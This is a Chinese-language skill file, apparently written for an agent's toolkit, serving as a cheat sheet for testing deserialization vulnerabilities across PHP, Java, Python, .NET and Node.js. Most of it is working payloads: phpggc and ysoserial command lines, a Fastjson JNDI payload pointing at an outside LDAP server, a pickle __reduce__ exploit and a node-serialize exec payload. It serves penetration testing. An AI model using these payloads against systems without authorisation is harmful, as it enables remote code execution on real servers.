---
name: deserialization-testing
description: 反序列化漏洞测试，覆盖PHP/Java/Python/.NET/Node.js的gadget链、检测方法和利用技巧
---

# 反序列化漏洞测试

## 概述

反序列化漏洞可导致RCE、权限提升和敏感数据泄露。本技能覆盖主流语言的gadget链和利用方法。

## 1. PHP反序列化

### 1.1 基础概念

```
序列化格式: O:<class_name_length>:"<class_name>":<property_count>:{...}
魔法方法: __wakeup() / __destruct() / __toString() / __call() / __get() / __set()
```

### 1.2 常用Gadget链

```php
# 基础Payload格式
O:N:"ClassName":N:{s:N:"prop";s:N:"value";}

# 属性引用 (& 绕过 __wakeup 属性数量校验)
O:N:"ClassName":N+1:{...}  # 属性数 > 实际数 → __wakeup被跳过

# 常用利用类:
# - Monolog → RCE
# - SwiftMailer → 文件写入
# - PHPUnit → RCE
# - Guzzle → 文件读取
```

### 1.3 phpggc工具

```bash
# 生成Payload
phpggc -l                          # 列出所有gadget链
phpggc Monolog/RCE1 system id      # Monolog RCE
phpggc Laravel/RCE5 system whoami  # Laravel RCE
phpggc -u Monolog/RCE1 system id   # URL编码输出
phpggc -b Monolog/RCE1 system id   # Base64输出
```

## 2. Java反序列化

### 2.1 检测方法

```bash
# 常见特征:
# - Content-Type: application/x-java-serialized-object
# - Base64编码的序列化数据 (rO0AB开头)
# - 参数名: data/object/payload

# ysoserial 工具
java -jar ysoserial.jar CommonsCollections5 'whoami' | base64
```

### 2.2 常用Gadget链

| Gadget | 适用场景 | 依赖 |
|--------|---------|------|
| CommonsCollections1-7 | Java < 8u71 | commons-collections 3.x/4.x |
| CommonsBeanutils1 | 无CC依赖 | commons-beanutils |
| Jdk7u21 | 无第三方依赖 | Java ≤ 7u21 |
| Jre8u20 | 无第三方依赖 | Java 8u20 |
| Spring1/2 | Spring应用 | spring-core |
| Fastjson | Fastjson ≤ 1.2.80 | fastjson |
| Jackson | Jackson启用defaultTyping | jackson-databind |

### 2.3 Fastjson利用

```json
# 检测
{"@type":"java.net.Inet4Address","val":"your-dns.dnslog.com"}

# JNDI注入
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://your-server/Exploit","autoCommit":true}
```

## 3. Python反序列化

```python
# pickle反序列化RCE
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)

# PyYAML反序列化 (!!python/object)
yaml.load(user_input)  # 危险!
```

## 4. .NET反序列化

```
# ysoserial.net 工具
# ViewState反序列化 (CVE-2020-0688)
# BinaryFormatter / LosFormatter / ObjectStateFormatter
```

## 5. Node.js反序列化

```javascript
// node-serialize RCE (CVE-2017-5941)
// 利用IIFE (Immediately Invoked Function Expression)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami')}()"}
```

---

*参考: ysoserial/phpggc/ysoserial.net + PortSwigger Deserialization*
